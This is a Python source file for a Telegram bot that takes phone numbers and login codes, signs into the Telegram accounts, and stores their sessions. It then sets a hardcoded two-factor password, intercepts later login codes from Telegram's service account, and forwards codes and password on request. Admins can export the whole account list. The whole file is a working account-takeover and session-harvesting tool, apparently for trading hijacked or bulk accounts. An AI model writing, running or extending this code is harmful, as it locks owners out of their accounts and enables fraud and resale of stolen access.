import os
import json
import re
from datetime import datetime
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"

SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"

WAITING_CODE = 1

clients = {}
pending = {}

def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
        "27": "🇿🇦", "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷",
        "7": "🇷🇺", "49": "🇩🇪", "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩",
        "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
        "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱"
    }
    p = str(phone).replace("+", "")
    for code in sorted(flags, key=len, reverse=True):
        if p.startswith(code):
            return flags[code]
    return "🏳️"

def get_country_code(phone):
    p = str(phone).replace("+", "")
    for code in ["880", "966", "971", "234", "212", "91", "92", "90", "86", "84", "82", "81", "66", "65", "63", "62", "60", "55", "52", "49", "48", "44", "40", "39", "33", "27", "20", "7", "1"]:
        if p.startswith(code):
            return code
    return p[:2]

def get_country_name(code):
    names = {
        "880": "Bangladesh", "91": "India", "1": "United States", "44": "United Kingdom",
        "27": "South Africa", "966": "Saudi Arabia", "971": "UAE", "90": "Turkey",
        "7": "Russia", "49": "Germany", "33": "France", "86": "China"
    }
    return names.get(str(code), f"Country +{code}")

async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {"code": m.group(1), "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            codes[phone] = codes[phone][:15]
            save_json(CODES_FILE, codes)

            accounts = load_json(ACCOUNTS_FILE, {})
            acc = accounts.get(phone)
            if acc and acc.get("back_mode"):
                try:
                    from telegram import Bot
                    bot = Bot(token=BOT_TOKEN)
                    flag = get_flag(phone)
                    msg = (
                        f"🔐 **New Login Code**\n\n"
                        f"🌍 {flag} {get_country_name(get_country_code(phone))}\n"
                        f"📱 `{phone}`\n"
                        f"🔑 Code: `{m.group(1)}`\n"
                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    await bot.send_message(chat_id=acc["uid"], text=msg, parse_mode="Markdown")
                except Exception as ex:
                    print("Back send error:", ex)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False

async def enable_2fa(client):
    try:
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except:
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"👋 Welcome **{user.first_name}**!\n\n"
        f"Send number with `+`\nExample: `+8801712345678`\n\n"
        f"/mynumber /backnumber /myfile",
        parse_mode="Markdown"
    )

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    wait = await update.message.reply_text("⏳ Sending code...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait.edit_text("Already logged in!")
            await client.disconnect()
            return ConversationHandler.END

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        await wait.edit_text(
            f"📲 {get_flag(phone)} `{phone}`\n\nCode sent! Send the login code.\n\n/cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except Exception as e:
        await wait.edit_text(f"Error: {e}")
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    print(f"CODE RECEIVED from {chat_id}: {update.message.text}")  # ডিবাগ

    if chat_id not in pending:
        await update.message.reply_text("Session expired. Send number again.")
        return ConversationHandler.END

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    uid = data["uid"]

    try:
        await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
    except PhoneCodeInvalidError:
        await update.message.reply_text("❗️ Invalid code. Try again.\n/cancel")
        return WAITING_CODE
    except SessionPasswordNeededError:
        await update.message.reply_text("Already has 2FA.")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"Login Error: {e}")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": me.first_name or "",
        "country": get_country_code(phone),
        "2fa": TWO_FA_PASSWORD if ok else "Failed",
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "back_mode": False
    }
    save_json(ACCOUNTS_FILE, accounts)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    await update.message.reply_text(
        f"✅ **Login Successful!**\n\n"
        f"{get_flag(phone)} `{phone}`\n"
        f"Name: {me.first_name}\n"
        f"2FA: {'Enabled' if ok else 'Failed'}",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled")
    return ConversationHandler.END

async def mynumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    count = {}
    for p, i in accounts.items():
        if i.get("uid") == uid:
            c = i.get("country") or get_country_code(p)
            count[c] = count.get(c, 0) + 1
    if not count:
        await update.message.reply_text("No numbers yet.")
        return
    kb = [[InlineKeyboardButton(f"{get_flag('+'+c)} {get_country_name(c)} ({n})", callback_data=f"myc_{c}")] for c, n in sorted(count.items(), key=lambda x: -x[1])]
    await update.message.reply_text("📱 Your Numbers:", reply_markup=InlineKeyboardMarkup(kb))

async def mycountry_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = q.data.replace("myc_", "")
    uid = q.from_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    nums = [p for p, i in accounts.items() if i.get("uid") == uid and (i.get("country") == code or get_country_code(p) == code)]
    text = f"{get_flag('+'+code)} **{get_country_name(code)}** ({len(nums)})\n\n" + "\n".join([f"`{p}`" for p in nums[:30]])
    await q.edit_message_text(text, parse_mode="Markdown")

async def backnumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    count = {}
    for p, i in accounts.items():
        if i.get("uid") == uid:
            c = i.get("country") or get_country_code(p)
            count[c] = count.get(c, 0) + 1
    if not count:
        await update.message.reply_text("No numbers.")
        return
    kb = [[InlineKeyboardButton(f"{get_flag('+'+c)} {get_country_name(c)} ({n})", callback_data=f"bk_{c}")] for c, n in count.items()]
    await update.message.reply_text("Select country for Back mode:", reply_markup=InlineKeyboardMarkup(kb))

async def back_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = q.data.replace("bk_", "")
    uid = q.from_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    n = 0
    for p, i in accounts.items():
        if i.get("uid") == uid and (i.get("country") == code or get_country_code(p) == code):
            i["back_mode"] = True
            accounts[p] = i
            n += 1
    save_json(ACCOUNTS_FILE, accounts)
    await q.edit_message_text(f"✅ Back mode ON\nNumbers: {n}")

async def myfile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    data = {p: i for p, i in accounts.items() if i.get("uid") == uid}
    if not data:
        await update.message.reply_text("No accounts.")
        return
    path = f"{DATA_DIR}/my_{uid}.json"
    save_json(path, data)
    await update.message.reply_document(open(path, "rb"), filename="my_accounts.json")

async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    accounts = load_json(ACCOUNTS_FILE, {})
    total = len(accounts)
    users = len(set(i.get("uid") for i in accounts.values() if i.get("uid")))
    text = f"👨‍💻 **Dashboard**\n\n👥 Users: `{users}`\n🔢 Numbers: `{total}`\n🟢 Online: `{len(clients)}`"
    kb = [
        [InlineKeyboardButton("📁 All Accounts", callback_data="a_all")],
        [InlineKeyboardButton("📢 BoardChat", callback_data="a_bc")],
        [InlineKeyboardButton("🔄 Reload", callback_data="a_rl")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    if q.data == "a_all":
        accounts = load_json(ACCOUNTS_FILE, {})
        path = f"{DATA_DIR}/all.json"
        save_json(path, accounts)
        await q.message.reply_document(open(path, "rb"), filename="all_accounts.json")
    elif q.data == "a_bc":
        context.user_data["bc"] = True
        await q.edit_message_text("Send broadcast message:")
    elif q.data == "a_rl":
        accounts = load_json(ACCOUNTS_FILE, {})
        loaded = 0
        for p in accounts:
            try:
                if await start_client(p):
                    loaded += 1
            except:
                pass
        await q.edit_message_text(f"Reloaded {loaded}")

async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.user_data.get("bc"):
        return
    context.user_data.pop("bc", None)
    text = update.message.text
    accounts = load_json(ACCOUNTS_FILE, {})
    users = list(set(i.get("uid") for i in accounts.values() if i.get("uid")))
    ok = 0
    for u in users:
        try:
            await context.bot.send_message(u, f"📢 {text}")
            ok += 1
        except:
            pass
    await update.message.reply_text(f"Sent to {ok} users")

async def post_init(app):
    print("Loading...")
    for p in load_json(ACCOUNTS_FILE, {}):
        try:
            await start_client(p)
        except:
            pass
    print("Ready!")

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[
            MessageHandler(
                filters.Regex(r'^\+?\d{8,15}$'),
                handle_phone
            )
        ],
        states={
            WAITING_CODE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    handle_code
                )
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mynumber", mynumber_cmd))
    app.add_handler(CommandHandler("backnumber", backnumber_cmd))
    app.add_handler(CommandHandler("myfile", myfile_cmd))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    app.add_handler(conv)

    app.add_handler(
        CallbackQueryHandler(mycountry_cb, pattern=r"^myc_")
    )
    app.add_handler(
        CallbackQueryHandler(back_cb, pattern=r"^bk_")
    )
    app.add_handler(
        CallbackQueryHandler(admin_cb)
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_text
        )
    )

    print("Starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
